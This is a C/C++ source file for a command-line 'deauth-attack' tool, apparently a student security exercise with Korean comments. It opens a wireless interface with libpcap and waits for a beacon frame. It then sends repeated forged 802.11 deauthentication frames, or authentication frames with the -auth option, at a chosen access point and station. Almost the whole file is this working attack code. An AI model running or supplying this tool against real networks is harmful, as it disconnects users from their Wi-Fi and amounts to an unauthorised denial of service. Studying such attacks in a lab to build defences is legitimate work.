#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <libnet.h>
#include "deauth.h"
#include "beacon.h"
#include "auth.h"

void usage() {
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

typedef struct {
    char* dev_;
    Mac apMac_;
    Mac stationMac_;
    bool option_;    // true(auth), false(deauth)
} Param;

Param param  = {
    .dev_ = NULL,
    .apMac_ = Mac("00:00:00:00:00:00"),
    .stationMac_ = Mac("00:00:00:00:00:00"),
    .option_ = false
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc < 3 || argc > 6) {
        usage();
        return false;
    }
    param->dev_ = argv[1];
    param->apMac_ = Mac(argv[2]);

    for(int i=3;i<argc;i++){
        std::string str = argv[i];
        if(str == "-auth")
            param->option_ = true;
        else
            param->stationMac_ = Mac(argv[i]);
    }
    return true;
}

int main(int argc, char* argv[]) {
    if (!parse(&param, argc, argv))
        return -1;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }

    // DeauthPacket 생성
    DeauthPacket deauthpkt = DeauthPacket(param.apMac_, param.stationMac_);

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        struct BeaconHdr* beaconHdr = (struct BeaconHdr*) packet;
        beaconHdr->setDot11Hdr();
        if(beaconHdr->dot11Hdr.type == 0x0 && beaconHdr->dot11Hdr.subtype == 0x8){  // beacon frame이 들어온 순간
            if(!param.option_){  // deauth
                // Deauth packet 전송
                for(int i=0;i<10;i++){
                    printf("send deauth packet\n");
                    int send_res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&deauthpkt), sizeof(DeauthPacket));
                    if (send_res != 0)
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", send_res, pcap_geterr(pcap));
                    sleep(3);
                }
                break;
            }
            else {  // auth
                // AuthPacket 생성
                AuthPacket authpkt = AuthPacket(param.apMac_, param.stationMac_);
                // Auth packet 전송
                for(int i=0;i<10;i++){
                    printf("send auth packet\n");
                    int send_res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&authpkt), sizeof(AuthPacket));
                    if (send_res != 0)
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", send_res, pcap_geterr(pcap));
                    sleep(3);
                }
                break;
            }
        }
    }
    pcap_close(pcap);
}
